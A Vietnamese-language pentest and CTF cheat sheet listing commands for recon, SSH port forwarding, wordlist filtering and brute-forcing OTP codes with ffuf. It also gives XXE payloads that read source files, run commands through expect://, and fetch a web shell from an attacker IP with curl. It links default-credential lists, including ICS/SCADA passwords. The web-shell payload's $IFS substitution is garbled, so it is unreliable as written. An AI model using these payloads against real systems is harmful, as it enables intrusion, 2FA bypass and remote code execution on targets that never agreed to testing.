# Penetration Testing & CTF Cheat Sheet

Một bảng tra cứu nhanh (Cheat Sheet) các lệnh hữu ích phục vụ cho quá trình Pentest, CTF, leo thang đặc quyền và khai thác lỗ hổng Web (XXE).

---

## 1. Trinh Sát & Kiểm Tra Hệ Thống (Reconnaissance)

### Kiểm tra các file có quyền SUID (Set Owner User ID)
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Kiểm tra các tiến trình đang chạy ẩn nội bộ của quyền root
```bash
ps aux | grep root
```

### Kiểm tra các cổng đang lắng nghe (Dùng `netstat`)
```bash
netstat -tulnp
```

### Kiểm tra các cổng đang lắng nghe (Dùng `ss` nếu không có `netstat`)
```bash
ss -tulnp
```

---

## 2. Kết Nối Từ Xa & Chuyển Tiếp Cổng (Port Forwarding)

### Chuyển cổng (Local Port Forwarding) qua SSH
```bash
ssh -L 2121:127.0.0.1:21 sshuser@154.57.164.72 -p 31873
```

### Kết nối từ xa trên Windows
Sử dụng công cụ mặc định: `Remote Desktop Connection` (RDP).

### Kết nối từ xa từ Linux sang Windows (Dùng `xfreerdp`)
```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
```

---

## 3. Xử Lý Wordlist & Biến Đổi Chuỗi (Data Manipulation)

### Lọc mật khẩu theo Regex
*Điều kiện: Độ dài >= 10, chứa ít nhất 1 chữ hoa, 1 chữ thường và 1 chữ số.*
```bash
awk 'length(\$0) >= 10 && /[A-Z]/ && /[a-z]/ && /[0-9]/' rockyou.txt > pass_da_loc.txt
```

### Tạo chuỗi số tăng dần có độ dài bằng nhau (Cờ `-w` thêm số 0 ở trước)
```bash
seq -w 1 9999
```

### Xử lý chuỗi nhanh trên Linux
* `echo -n "chuỗi"`: Không tự động thêm ký tự xuống dòng (`\n`) ở cuối.
* `base64 -w 0`: Mã hóa Base64 và ép toàn bộ kết quả hiển thị trên một dòng duy nhất.
* `tr -d ' -'`: Xóa toàn bộ dấu cách (khoảng trắng) và dấu gạch ngang (`-`) trong chuỗi.

---

## 4. Tấn Công Dò Thám (Brute Force)

### Brute force mã OTP bằng `ffuf`
```bash
ffuf -w <FILE_NAME> -u <TARGET_HOST> -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -b "session=<SESSION_COOKIE>" \
     -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

---

## 5. Khai Thác Lỗ Hổng XXE Injection

### Mã hóa nội dung bằng PHP Filter để đọc file mã nguồn (Tránh lỗi định dạng)
```xml
<!ENTITY company SYSTEM "php://filter/read=convert.base64-encode/resource=abc.php">
```

### Thực thi lệnh hệ thống qua XXE (Yêu cầu target cài module `expect`)
```xml
<!ENTITY company SYSTEM "expect://id">
```

### Tải Web Shell về server mục tiêu thông qua XXE (Sử dụng `$IFS` thay khoảng trắng)
```xml
<!ENTITY company SYSTEM "expect://curlIFS-OIFS'OUR_IP/shell.php'">
```

### Đọc file chứa ký tự đặc biệt bằng cách bọc trong thẻ CDATA
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % joined "&begin;&file;&end;">
]>
```

---

## 6. Tài Nguyên & Danh Sách Hữu Ích (Wordlists & Datasets)

* **Danh sách Username phổ biến:** [SecLists Usernames](https://github.com)
* **Danh sách thông tin đăng nhập mặc định:** [SecLists Default Credentials](https://github.com)
* **Tài khoản mặc định của hệ thống điều khiển công nghiệp (ICS/SCADA):** [SCADAPASS](https://github.com)
* **Dữ liệu tên các thành phố trên thế giới:** [World Cities Dataset](https://github.com)
